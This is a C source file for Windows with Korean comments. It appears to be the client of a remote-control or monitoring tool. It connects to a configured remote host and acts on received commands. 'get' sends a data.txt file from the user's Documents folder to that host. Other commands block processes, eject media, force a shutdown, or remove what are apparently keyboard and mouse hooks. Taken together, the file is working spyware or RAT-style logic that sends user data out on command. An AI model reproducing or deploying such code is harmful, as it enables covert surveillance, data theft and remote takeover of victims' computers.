#include "modules.h"


void CreateSocket()//소켓생성함수
{
	hSocket = socket(AF_INET, SOCK_STREAM, 0);
	if (hSocket == INVALID_SOCKET)
		MessageBox(hWndMain, TEXT("hSocket Failed"), TEXT("Error"), MB_OK);

	memset(&hAddr, 0, sizeof(hAddr));
	hAddr.sin_family = PF_INET;
	hAddr.sin_port = htons(REMOTEPORT);
	hAddr.sin_addr.s_addr = inet_addr(RemoteAddr);

}


int KillProcess(TCHAR* name)
{
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;
	HANDLE hProcess;

	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hProcessSnap == INVALID_HANDLE_VALUE)
		return 1;

	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hProcessSnap, &pe32))
		return 1;

	do {
		if (!_tcscmp(name, pe32.szExeFile))
		{
			hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
			if (hProcess != NULL)
			{
				TerminateProcess(hProcess, -1);
				CloseHandle(hProcess);
				return 0;
			}
		}

	} while (Process32Next(hProcessSnap, &pe32));

	return 1;


}


void RecvProc()
{
	DWORD numOfByteRead = 0;
	TCHAR DataFileName[BUF_SIZE] = { 0, };
	char RecvMessage[BUF_SIZE];
	char sendmessage[FILE_BUF];
	int Len;
	static BOOL isblock = FALSE;
	TCHAR Username[10];
	DWORD UserLen;
	HANDLE pThread;
		

	GetUserName(Username, &UserLen);
	wsprintf(DataFileName, TEXT("C:\\Users\\%s\\Documents\\data.txt"), Username);


	while (1) {

		Len = recv(hSocket, RecvMessage, sizeof(RecvMessage), 0);

		if (strncmp(RecvMessage, "get", 3) == 0)//get명령이 전송된경우
		{
			//파일전송
			hFile = CreateFile(DataFileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
			while (1)
			{

				ReadFile(hFile, sendmessage, FILE_BUF, &numOfByteRead, NULL);

				if (numOfByteRead <= 0) {
					break;
				}

				send(hSocket, sendmessage, numOfByteRead, NULL);

			}
			CloseHandle(hFile);
		}
		else if (strncmp(RecvMessage, "block", 5) == 0) {


			if (!isblock) {

				pThread = (HANDLE)_beginthreadex(NULL, 0, ProcessBlocker, NULL, 0, 0);
				isblock = TRUE;
			}

		}
		else if (strncmp(RecvMessage, "unblock", 7) == 0) {

			if (isblock) {

				TerminateThread(pThread, 0);
				CloseHandle(pThread);
				pThread = NULL;
				isblock = FALSE;
			

			}


		}
		else if (strncmp(RecvMessage, "eject", 5) == 0) {

			system("eject.bat");


		}
		else if (strncmp(RecvMessage, "kill", 4) == 0)//kill명령이 전송된 경우
		{
			 
			closesocket(hSocket);
			Kuninstallhook();
			Muninstallhook();
			FreeLibrary(KhinstDll);
			WSACleanup();
			KillProcess(TEXT("Controller.exe"));
			
			break;

		}
		else if (strncmp(RecvMessage, "shutdown", 8) == 0) {


			closesocket(hSocket);
			Kuninstallhook();
			Muninstallhook();
			FreeLibrary(KhinstDll);
			WSACleanup();
			system("shutdown -s -t 0");
			KillProcess(TEXT("Controller.exe"));
			break;
		}
		else if (Len == 0) {//eof전달시
			isEof = TRUE;//eof코드 TRUE로설정
			break;
		}

	}

}

